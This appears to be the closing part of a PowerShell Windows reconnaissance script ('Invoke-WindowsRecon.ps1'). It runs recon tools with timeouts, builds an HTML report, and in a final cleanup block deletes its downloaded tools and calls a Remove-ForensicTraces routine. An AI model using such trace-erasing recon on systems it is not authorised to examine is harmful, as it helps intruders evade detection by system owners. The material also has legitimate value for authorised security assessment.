            if ($toolData.Script) {
                $toolDataForRunspace["Script"] = $toolData.Script
            }
            if ($toolData.Path) {
                $toolDataForRunspace["Path"] = $toolData.Path
            }

            $runspace.AddArgument([PSCustomObject]$toolDataForRunspace)
            $runspace.AddArgument($outputDir)

            $handle = $runspace.BeginInvoke()

            # Wait with timeout, updating dashboard periodically
            $deadline = (Get-Date).AddSeconds($timeoutSec)
            while (-not $handle.IsCompleted -and (Get-Date) -lt $deadline) {
                Start-Sleep -Milliseconds 500
                Show-Dashboard
            }

            if (-not $handle.IsCompleted) {
                # Timeout
                $runspace.Stop()
                $runspace.Dispose()
                $Script:ToolResults[$toolName].Status = "TIMEOUT"
                $Script:ToolResults[$toolName].Error = "Exceeded ${timeoutSec}s timeout"
                $Script:ToolResults[$toolName].Duration = $timeoutSec
                Write-Log "Tool $toolName timed out after ${timeoutSec}s" -Level "ERROR"
            } else {
                try {
                    $result = $runspace.EndInvoke($handle)
                    $runspace.Dispose()

                    $outputFile = Join-Path $Script:OutputDir "$toolName-output.txt"
                    $duration = ((Get-Date) - $Script:ToolResults[$toolName].StartedAt).TotalSeconds

                    if (Test-Path $outputFile) {
                        $fileSize = (Get-Item $outputFile).Length
                        $Script:ToolResults[$toolName].Status = "OK"
                        $Script:ToolResults[$toolName].Duration = $duration
                        $Script:ToolResults[$toolName].OutputSize = $fileSize
                        Write-Log "Tool $toolName completed in $([math]::Round($duration, 1))s - Output: $fileSize bytes"
                    } else {
                        throw "$toolName completed but produced no output file"
                    }
                } catch {
                    $runspace.Dispose()
                    throw
                }
            }

            # Clean up background job if created
            if ($job) { Remove-Job $job -Force -ErrorAction SilentlyContinue }

        } catch {
            $errMsg = $_.Exception.Message
            if ($_.Exception.InnerException) {
                $errMsg = $_.Exception.InnerException.Message
            }
            if ($errMsg.Length -gt 80) { $errMsg = $errMsg.Substring(0, 80) + "..." }

            $duration = if ($Script:ToolResults[$toolName].StartedAt) {
                ((Get-Date) - $Script:ToolResults[$toolName].StartedAt).TotalSeconds
            } else { 0 }

            $Script:ToolResults[$toolName].Status = "FAIL"
            $Script:ToolResults[$toolName].Error = $errMsg
            $Script:ToolResults[$toolName].Duration = $duration
            Write-Log "Tool $toolName execution failed: $($_.Exception.Message)" -Level "ERROR"
        }

        Show-Dashboard
    }

    # Phase 3: Summary
    $Script:CurrentPhase = "SUMMARY"
    Show-Summary

    # Phase 3.5: Consolidated HTML Report
    if ($GenerateHtmlReport) {
        $Script:CurrentPhase = "REPORT"
        Show-Dashboard
        Write-Host ""
        Write-Host "  Generating consolidated HTML report..." -ForegroundColor DarkGray
        try {
            $htmlReportPath = New-ConsolidatedHtmlReport
            Write-Host "  [OK]  " -ForegroundColor Green -NoNewline
            Write-Host "HTML report: $htmlReportPath"
            Write-Log "HTML report generated: $htmlReportPath"
        } catch {
            Write-Host "  [WARN] " -ForegroundColor Yellow -NoNewline
            Write-Host "HTML report generation failed: $($_.Exception.Message)"
            Write-Log "HTML report generation failed: $($_.Exception.Message)" -Level "ERROR"
        }
        Write-Host ""
    }

    $Script:ScriptCompleted = $true

} finally {
    # Phase 4: Cleanup (ALWAYS runs, even on Ctrl+C)
    # Skip cleanup if we were in cleaner mode (already handled)
    if (-not $Clean) {
        $Script:CurrentPhase = "CLEANUP"

        Write-Host ""
        if (-not $Script:ScriptCompleted) {
            Write-Host "  Script interrupted/failed - performing emergency cleanup..." -ForegroundColor Red
        } else {
            Write-Host "  Performing cleanup..." -ForegroundColor DarkGray
        }

        # Remove downloaded tools (temp bat files etc.)
        Remove-ReconTools

        # If script didn't complete, also remove partial output
        if (-not $Script:ScriptCompleted) {
            Remove-PartialOutput
        }

        # Remove forensic traces
        $cleanupResults = Remove-ForensicTraces

        # Show cleanup report
        Show-CleanupReport -CleanupResults $cleanupResults

        if ($Script:ScriptCompleted) {
            Write-Host "  Recon complete. Results saved to:" -ForegroundColor Green
            Write-Host "  $($Script:OutputDir)" -ForegroundColor Cyan
        } else {
            if ($Script:OutputDir -and (Test-Path $Script:OutputDir -ErrorAction SilentlyContinue)) {
                Write-Host "  Partial results may be at:" -ForegroundColor Yellow
                Write-Host "  $($Script:OutputDir)" -ForegroundColor Yellow
            } else {
                Write-Host "  No output saved (cleaned up partial data)." -ForegroundColor Yellow
            }
            Write-Host ""
            Write-Host "  To clean any remaining traces, run:" -ForegroundColor DarkGray
            Write-Host "  .\Invoke-WindowsRecon.ps1 -Clean" -ForegroundColor Cyan
        }
        Write-Host ""
    }
}
